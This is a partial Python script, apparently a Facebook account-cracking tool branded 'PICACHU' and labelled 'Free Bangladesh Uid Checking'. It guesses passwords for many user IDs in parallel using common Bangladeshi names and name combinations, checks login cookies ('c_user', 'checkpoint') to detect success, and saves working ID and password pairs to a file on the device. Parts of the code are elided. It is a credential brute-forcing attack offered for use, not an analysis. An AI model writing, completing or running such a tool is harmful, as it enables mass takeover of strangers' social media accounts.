...
logo = """ \033[1;33m
\033[1;33m  _____ _____ _____          _____ _    _ _    _ 
\033[1;33m |  __ \_   _/ ____|   /\   / ____| |  | | |  | |
\033[1;33m | |__) || || |       /  \ | |    | |__| | |  | |
\033[1;33m |  ___/ | || |      / /\ \| |    |  __  | |  | |
\033[1;33m | |    _| || |____ / ____ \ |____| |  | | |__| |
\033[1;33m |_|   |_____\_____/_/    \_\_____|_|  |_|\____/ 
\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;31m[+] Developer ➤ Ostir boy shawon 
\033[1;35m[+] Facebook  ➤ ew'r prince shawon 
\033[1;36m[+] Version   ➤ 0.1
\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;32m[Tool ➤ Free Bangladesh Uid Checking]
\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;32m"""
ok = []
cp = []
...
def Main():
	...
	with tred(max_workers=60) as turag:
		...
		for guru in user:
			...
			pwx = [lova+lovb+guru,love+lova+lovb,love+love,'arafat','saiful','shakil','nazmul','babama']
...
def test(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r\033[1;90m[\033[1;92mSHAWON\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                if 'LOCK' in res:
                    ...
                    print(f'  \r\033[1;92m  [PIKACHU-OK] '+cid+' | '+ps+'\33[0;92m')
                    oks.append(uid)
                    open('/sdcard/pikachu-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                    break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                #print(f"\r\33[1;92m[SHAWON-CP] {uid} | {ps}")
